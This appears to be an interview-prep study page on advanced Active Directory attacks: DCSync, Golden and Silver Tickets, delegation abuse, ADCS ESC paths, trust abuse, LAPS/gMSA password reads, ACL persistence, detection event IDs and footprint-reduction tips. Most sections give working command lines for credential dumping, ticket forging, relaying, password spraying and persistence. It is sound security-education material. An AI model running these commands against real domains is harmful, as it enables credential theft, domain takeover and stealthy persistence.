# Active Directory — Advanced

!!! info "Why This Matters"
    Senior-level AD attacks are what convert a domain user into Domain Admin. Understanding these techniques is also essential for defensive work — you can only detect and prevent what you understand mechanically. Every senior pentest interview probes AD depth. If you claim AD experience, you must be able to explain these attacks at the protocol level.

---

## DCSync

DCSync abuses the Active Directory replication mechanism to extract password hashes from a Domain Controller without logging into the DC directly.

### How Replication Works

Active Directory replicates changes between Domain Controllers using the **MS-DRSR (Directory Replication Service Remote Protocol)**. When a new DC is added or changes occur, DCs pull updates from each other using `IDL_DRSGetNCChanges` — a replication RPC call. This call returns account objects including their NTLM hashes and Kerberos keys.

### The Attack

If a principal has the `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` rights on the domain object (or the `DS-Replication-Get-Changes-In-Filtered-Set` right), they can issue a replication request as if they were a Domain Controller — receiving all user hashes including `krbtgt`.

```bash
# Check who has DCSync rights
# BloodHound: "Find Principals with DCSync Rights"
# PowerView:
Get-ObjectAcl -DistinguishedName "DC=corp,DC=local" -ResolveGUIDs | 
  Where-Object {$_.ObjectType -match "DS-Replication"}

# Execute DCSync with secretsdump (from Linux, requires creds with replication rights)
secretsdump.py corp.local/syncuser:password@dc.corp.local

# Execute DCSync with Mimikatz (from Windows with appropriate privileges)
# lsadump::dcsync /domain:corp.local /all /csv
# lsadump::dcsync /domain:corp.local /user:krbtgt
```

**Output includes:** NTLM hash for every account, Kerberos keys, historical password hashes (if stored), and the krbtgt hash — which enables Golden Ticket attacks.

**Who has DCSync rights by default:** Domain Admins, Enterprise Admins, Domain Controllers, SYSTEM on DCs. Any non-DC account with these rights is a finding.

**Detection:** Windows event ID 4662 (object operation) for the `DS-Replication-Get-Changes-All` right. SIEM alerts on replication requests originating from non-DC IP addresses.

---

## Golden Ticket

The Golden Ticket is a forged Kerberos TGT (Ticket Granting Ticket) signed with the `krbtgt` account's hash. Since all TGTs in the domain are encrypted with `krbtgt`'s key, a valid `krbtgt` hash allows creating a TGT for any user, including non-existent users, with any group memberships, with any expiry time.

### Why It's Powerful

- Forged TGT is indistinguishable from legitimate TGTs to domain services

- Can forge membership in any group (Domain Admins, Enterprise Admins)

- Persists even after the compromised account's password is changed — krbtgt must be rotated **twice** (due to how Kerberos handles previous password validation)

- Default TGT lifetime is 10 hours, renewable up to 7 days. Golden Tickets can be forged with 10-year lifetimes

### Creating a Golden Ticket

```bash
# Requirements: krbtgt NTLM hash, domain SID
# Obtain via DCSync:
secretsdump.py corp.local/admin:password@dc.corp.local | grep krbtgt

# Get domain SID
Get-DomainSID  # PowerView
whoami /user   # S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX-1103 → strip last component

# Create Golden Ticket with Impacket
ticketer.py -nthash <krbtgt_hash> -domain-sid <domain_SID> -domain corp.local administrator
# Creates: administrator.ccache (Kerberos credential cache file)

# Use the ticket
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass dc.corp.local

# With Rubeus (Windows)
Rubeus.exe golden /rc4:<krbtgt_hash> /domain:corp.local /sid:<domain_SID> /user:Administrator /ptt
# /ptt = pass-the-ticket (inject into current session)
```

**Mitigation:** Rotate `krbtgt` password twice (enables invalidating all outstanding TGTs), implement Protected Users group for privileged accounts, monitor for Kerberos tickets with lifetimes exceeding domain policy.

---

## Silver Ticket

A Silver Ticket is a forged Service Ticket (TGS) signed with a *service account's* NTLM hash — not the `krbtgt` hash. It grants access to a specific service without contacting the KDC.

### Key Difference from Golden Ticket

| | Golden Ticket | Silver Ticket |
|--|---------------|---------------|
| Signed with | krbtgt hash | Service account hash |
| Grants access to | Any service (TGT) | One specific service |
| KDC involved | No | No |
| Domain-wide? | Yes | No — one service only |
| Detectability | Harder | Slightly easier (PAC validation) |

### When to Use Silver Tickets

When you have a service account's hash but not `krbtgt`. Create a service ticket for that service directly — access the service without authentication.

```bash
# Example: forge CIFS ticket to access file share on target server
# Requirements: machine account hash or service account hash, domain SID, SPN

ticketer.py -nthash <machine_account_hash> \
  -domain-sid <domain_SID> \
  -domain corp.local \
  -spn cifs/server01.corp.local \
  administrator

export KRB5CCNAME=administrator.ccache
smbclient.py -k corp.local/administrator@server01.corp.local

# Common Silver Ticket service targets:
# CIFS/server     → File shares
# HTTP/server     → IIS web services using Windows auth
# HOST/server     → Schedule tasks, create services remotely
# MSSQL/server    → SQL Server access
```

---

## Kerberos Delegation

Delegation allows a service to impersonate users when accessing downstream services on their behalf. Three types exist, with significantly different security implications.

### Unconstrained Delegation

The most dangerous configuration. Services with unconstrained delegation receive the user's full TGT in the service ticket — allowing impersonation of that user to *any* service.

**Finding it:**
```powershell
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation
Get-ADUser -Filter {TrustedForDelegation -eq $true}
# BloodHound: "Shortest Paths to Unconstrained Delegation Systems"
```

**Exploitation — Printer Bug / SpoolSample:**
```bash
# If you have local admin on a machine with unconstrained delegation:
# 1. Monitor for incoming TGTs
Rubeus.exe monitor /interval:5 /nowrap

# 2. Coerce a DC to authenticate to the delegation machine
# SpoolSample - abuses Windows Print Spooler (MS-RPRN)
SpoolSample.exe dc01.corp.local delegation-machine.corp.local
# DC's machine account TGT arrives at the delegation machine
# DC machine account can DCSync

# 3. Extract and use the DC's TGT
Rubeus.exe ptt /ticket:<base64_ticket>
secretsdump.py -k -no-pass dc01.corp.local
```

### Constrained Delegation

Limits delegation to specific services. A service with constrained delegation can only impersonate users to the explicitly configured target services. Still exploitable if you control the account with constrained delegation.

**Finding it:**
```powershell
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
```

**Exploitation:**
```bash
# If you control an account with constrained delegation configured to CIFS/server01:
# Request a service ticket for any user (even privileged) to that specific service
Rubeus.exe s4u /user:svc_constrained /rc4:<hash> /impersonateuser:administrator /msdsspn:cifs/server01.corp.local /ptt
```

### Resource-Based Constrained Delegation (RBCD)

Newer model where the *target* resource defines who can delegate to it (via `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute), rather than the source service.

**Exploitation — requires GenericWrite on computer object:**
```bash
# If you have GenericWrite on a computer object:
# 1. Create or use a computer account with a known hash
# 2. Set RBCD on target computer, allowing your computer account to delegate
Set-ADComputer target -PrincipalsAllowedToDelegateToAccount attacker_computer$

# 3. Request S4U2Proxy ticket impersonating Domain Admin
Rubeus.exe s4u /user:attacker_computer$ /rc4:<hash> /impersonateuser:administrator /msdsspn:cifs/target.corp.local /ptt
```

---

## ADCS — Active Directory Certificate Services

ADCS is Microsoft's PKI implementation. Misconfigurations create privilege escalation and persistence paths. Research by SpecterOps (the "Certified Pre-owned" whitepaper) documented the ESC attack paths (ESC1 through ESC13+).

### ESC1 — Misconfigured Certificate Templates

Certificate templates with:

- `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` enabled (client can specify SAN — Subject Alternative Name)

- Enrollment rights for low-privileged groups (Domain Users)

- EKU (Extended Key Usage) allows Client Authentication

This lets any domain user enroll for a certificate with any subject (e.g., `administrator@corp.local`) in the SAN → authenticate as that user.

```bash
# Find vulnerable templates
certipy find -u user@corp.local -p password -dc-ip dc_ip -vulnerable

# Request certificate for administrator
certipy req -u user@corp.local -p password -dc-ip dc_ip \
  -target ca.corp.local -ca "Corp-CA" \
  -template VulnerableTemplate \
  -upn administrator@corp.local

# Authenticate using the certificate
certipy auth -pfx administrator.pfx -dc-ip dc_ip
# Returns: NTLM hash for administrator → PtH or use Kerberos ticket
```

### ESC2 — Any Purpose EKU or No EKU

Template with "Any Purpose" EKU or no EKU at all can be used for any purpose including client auth — same impact as ESC1.

### ESC3 — Certificate Request Agent

A template allowing Certificate Request Agent enrollment combined with another template that allows enrollment on behalf of another user. Chain them to get certificates for any user.

### ESC4 — Vulnerable Certificate Template Access Control

A principal has write access to a certificate template → modify the template to add ESC1 conditions → exploit as ESC1.

### ESC8 — NTLM Relay to AD CS HTTP Endpoints

AD CS web enrollment endpoints (`/certsrv/`) are often enabled and accept NTLM authentication without required signing. Relay NTLM authentication (via Responder or other coercion) to the CA's web endpoint to obtain a certificate.

```bash
# Coerce DC to authenticate, relay to CA web endpoint
ntlmrelayx.py -t http://ca.corp.local/certsrv/certfnsh.asp \
  --adcs --template DomainController
# Returns certificate for DC machine account → can DCSync using certificate auth
```

**Tools:**
```bash
# Certipy — comprehensive ADCS attack tool
certipy find -u user@corp.local -p password -dc-ip dc_ip
certipy req ...
certipy auth ...

# Certify (Windows/C#)
Certify.exe find /vulnerable
Certify.exe request /ca:corp\Corp-CA /template:VulnTemplate /altname:administrator
```

---

## Trust Attacks

Domain trusts extend authentication across domain and forest boundaries. Misconfigurations allow escalation from one domain to another.

### Intra-Forest Trust Exploitation

All domains in a forest share an implicit two-way transitive trust. A user in any domain can be escalated to Enterprise Admin (forest root) via SID history abuse.

**SID History:** When users are migrated between domains, their old SID is added to `sIDHistory`. Kerberos includes `sIDHistory` in PAC data. An attacker with the inter-realm trust key can forge a PAC with Enterprise Admin SID in sIDHistory.

```bash
# Get inter-realm trust key (requires child domain DA)
secretsdump.py child.corp.local/admin:pass@childdc.child.corp.local

# Forge inter-realm TGT with Enterprise Admins SID in sIDHistory
ticketer.py -nthash <trust_key> \
  -domain-sid <child_domain_SID> \
  -extra-sid <parent_domain_SID>-519 \  # 519 = Enterprise Admins RID
  -domain child.corp.local administrator

# Use to access parent domain
export KRB5CCNAME=administrator.ccache
secretsdump.py -k -no-pass rootdc.corp.local
```

### External / Forest Trust Exploitation

Forest trusts have SID filtering enabled by default (blocks sIDHistory injection). But misconfigurations (selective authentication disabled, fully trusted SIDs) may still enable escalation.

---

## LAPS — Local Administrator Password Solution

LAPS automatically manages and rotates local administrator passwords on domain-joined machines, storing them in AD attributes. This solves the lateral movement problem of shared local admin passwords — but the AD attribute storing the password becomes the new attack target.

### Understanding LAPS Architecture

```
LAPS stores local admin passwords in:
  ms-Mcs-AdmPwd          — the cleartext password (computer object attribute)
  ms-Mcs-AdmPwdExpirationTime — when the password expires

Access control:
  By default, only Domain Admins can read ms-Mcs-AdmPwd
  Administrators commonly delegate read access to help desk groups, IT teams
  These delegated groups are what attackers target
```

### Finding LAPS in the Environment

```powershell
# Check if LAPS is deployed
Get-ADObject 'CN=ms-Mcs-AdmPwd,CN=Schema,CN=Configuration,DC=corp,DC=local' 2>$null
# If this exists, LAPS schema extension is installed

# Check which computers have LAPS managed (password expiry is set)
Get-ADComputer -Filter {ms-Mcs-AdmPwdExpirationTime -like '*'} -Properties ms-Mcs-AdmPwdExpirationTime
# If you find computers with expiry times, LAPS is active on those machines
```

### Reading LAPS Passwords

```powershell
# Via PowerView — find who can read LAPS passwords
Find-AdmPwdExtendedRights -Identity "OU=Workstations,DC=corp,DC=local"
# Returns: accounts/groups with permission to read ms-Mcs-AdmPwd

# If you have access (direct domain admin or delegated):
Get-AdmPwdPassword -ComputerName workstation01
# Returns: ComputerName, Password, ExpirationTimestamp

# Via CrackMapExec
cme ldap dc.corp.local -u user -p password -M laps
# Lists all computers with their LAPS passwords if your user has read rights

# Via BloodHound
# Query: "Find All Paths to LAPS Read"
# Nodes with 'ReadLAPSPassword' edge to computer objects

# Via LDAP directly
Get-ADComputer workstation01 -Properties ms-Mcs-AdmPwd | Select ms-Mcs-AdmPwd
```

### LAPS in BloodHound

BloodHound maps which principals have `ReadLAPSPassword` rights on computer objects. In an assessment, after running SharpHound with `-c All`, check for:

- Any non-administrative groups with LAPS read rights

- Users with LAPS read rights who are compromised

- Any path from your current user to a node with LAPS read rights

A compromised account with LAPS read rights on 200 workstations = local admin on all 200 workstations = broad lateral movement.

---

## gMSA — Group Managed Service Accounts

Group Managed Service Accounts automatically manage service account passwords, rotating them on a schedule. The password is not accessible to administrators in cleartext — but the `msDS-ManagedPassword` attribute can be read by authorized principals.

```powershell
# Find gMSAs in the environment
Get-ADServiceAccount -Filter * -Properties msDS-GroupMSAMembership,PrincipalsAllowedToRetrieveManagedPassword

# Check who can retrieve the gMSA password
Get-ADServiceAccount gMSA_AccountName -Properties PrincipalsAllowedToRetrieveManagedPassword

# If your compromised account is in the allowed group:
# Retrieve the gMSA password blob and convert to NT hash
# Tool: GMSAPasswordReader (by rvazarkar)
GMSAPasswordReader.exe --AccountName gMSA_AccountName

# The NT hash can then be used for Pass-the-Hash
# Or: Get Kerberos tickets for the gMSA account
```

**Why this matters:** gMSA accounts often run services with elevated privileges. If a service account runs as Domain Admin (misconfiguration) or has privileged database access, reading its managed password provides those privileges.

---

## ACL-Based Persistence in Active Directory

After achieving Domain Admin, attackers establish persistent access through AD ACLs — modifications that survive password resets and even some account disablements.

### Common ACL Persistence Techniques

**Add DCSync rights to a low-privilege account:**
```powershell
# Grant replication rights to an attacker-controlled account
# This survives even if DA password is reset
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    [System.Security.Principal.SecurityIdentifier]"S-1-5-21-...-1234",  # Attacker account SID
    [System.DirectoryServices.ActiveDirectoryRights]"ExtendedRight",
    [System.Security.AccessControl.AccessControlType]"Allow",
    [System.DirectoryServices.ActiveDirectorySecurityInheritance]"None",
    [System.Guid]"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"  # DS-Replication-Get-Changes
)
# Add to domain object ACL
```

**Grant GenericAll on a privileged account:**
```powershell
# Gives attacker full control over a DA account
# Can reset password, modify properties, add SPN for Kerberoasting
Add-DomainObjectAcl -TargetIdentity "Domain Admins" `
    -PrincipalIdentity attacker_account `
    -Rights All
```

**AdminSDHolder abuse:**
The AdminSDHolder is a special AD object that propagates its ACL to all protected groups (Domain Admins, Enterprise Admins, etc.) every 60 minutes via the SDProp process. Adding an ACE to AdminSDHolder means every 60 minutes, your ACE is propagated to all privileged groups — even if someone removes it from those groups directly.

```powershell
# Add ACE to AdminSDHolder — persists via SDProp
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=corp,DC=local" `
    -PrincipalIdentity attacker_account `
    -Rights All
```

**Detection:** Monitor for unexpected modifications to:

- Domain object ACL (DS-Replication rights added)

- AdminSDHolder ACL modifications

- GenericAll/GenericWrite granted to non-admin accounts

- Changes to `msDS-AllowedToActOnBehalfOfOtherIdentity` on computer objects

---

## AD Attack Detection Reference

Understanding what Windows events each technique generates helps both attackers minimize footprint and defenders build detection rules.

### Event ID Reference for AD Attacks

| Technique | Event ID | Location | Notes |
|-----------|----------|----------|-------|
| Failed logon | 4625 | Security log | High volume — filter for source IPs, patterns |
| Kerberos preauth failure | 4771 | DC Security log | Lower volume than 4625 — password spray indicator |
| Kerberos TGT requested | 4768 | DC Security log | Normal — but unusual accounts at unusual hours |
| Kerberos service ticket | 4769 | DC Security log | Kerberoasting: multiple RC4 (0x17) tickets in short time |
| AS-REP Roasting | 4768 with RC4 | DC Security log | Encryption type 0x17 + no preauth |
| DCSync | 4662 | DC Security log | `DS-Replication-Get-Changes` from non-DC IP |
| LDAP enumeration | 1644 | DC log (debug) | Requires enabling expensive LDAP query logging |
| BloodHound collection | Multiple | DC Security | High volume of LDAP queries in short period |
| Pass-the-Hash | 4624 LogonType 3 | Security log | NTLM logon with NTLMv1/v2 |
| Golden Ticket | 4769 | DC Security log | Ticket lifetime > domain policy, or non-existent username |
| Persistence via RunKey | 4657 | Security log | Registry modification (requires audit policy) |
| Scheduled task creation | 4698 | Security log | Remote task creation |
| Service creation | 7045 | System log | Remote service creation (psexec, SMBExec) |
| LSASS access | 10 (Sysmon) | Sysmon log | ProcessAccess to lsass.exe |
| LAPS password read | 4662 | DC Security | `ms-Mcs-AdmPwd` read operation |

### Reducing Footprint During Authorized AD Assessments

In stealth-scoped engagements, these practices minimize detection:

**Enumeration:**
```powershell
# Prefer LDAP queries over net commands (less noisy)
Get-ADUser -Filter * | Select SamAccountName   # vs net user /domain
Get-ADGroupMember "Domain Admins"              # vs net group "Domain Admins" /domain

# BloodHound: use DCOnly collection where possible
SharpHound.exe -c DCOnly    # Only queries DC — fewer endpoints touched
# vs -c All which touches every domain computer
```

**Credential attacks:**
```powershell
# Kerberos over LDAP for spraying (different event IDs, often fewer alerts)
# Use Kerbrute rather than LDAP-based spraying
kerbrute passwordspray -d corp.local users.txt 'Password!' --dc dc.corp.local

# Prefer Kerberoasting over AS-REP roasting when you have credentials
# AS-REP roasting without credentials is noisier
```

**Lateral movement:**
```bash
# WMIExec and SMBExec over PSExec where possible
# PSExec creates a service (event 7045) — more detectable
# WMIExec uses WMI — slightly fewer artifacts

# Use existing tools already on the system (LOLBins) where possible
# Custom tools introduced to disk = new file hash = potential AV/EDR alert
```

**Timing:**
```
# Operate during business hours when possible
# Elevated LDAP query volume is more suspicious at 3 AM
# Blend with normal traffic patterns
```

---

## AD Security Interview Deep Cuts

These questions appear at senior level specifically. Prepare detailed answers.

**"How does SID filtering protect against trust abuse?"**
SID filtering prevents cross-forest attacks by stripping `sIDHistory` and foreign domain SIDs from Kerberos PAC data when authentication crosses a trust boundary. This prevents the intra-forest trust escalation (child-to-parent) technique from working across forest trusts. However, selective authentication and specific configurations can weaken SID filtering — and intra-forest trusts never have SID filtering (all domains in a forest implicitly trust each other).

**"What is AdminSDHolder and how is it abused?"**
AdminSDHolder is an AD object in the System container that serves as a permission template. The SDProp process (runs every 60 minutes by default on the PDC Emulator) propagates AdminSDHolder's ACL to all members of protected groups (Domain Admins, Enterprise Admins, Schema Admins, etc.). Attackers abuse this by adding their ACE to AdminSDHolder — even if defenders remove the ACE from individual groups, SDProp re-adds it within an hour.

**"Explain the difference between T1558 sub-techniques."**
MITRE T1558 covers Steal or Forge Kerberos Tickets:

- T1558.001 — Golden Ticket: forge TGT using krbtgt hash, domain-wide

- T1558.002 — Silver Ticket: forge service ticket using service account hash, single service

- T1558.003 — Kerberoasting: request legitimate TGS for offline cracking, no special rights needed

- T1558.004 — AS-REP Roasting: request AS-REP for accounts without preauth, offline cracking
Each has different prerequisites and detection signatures — understand all four distinctly.
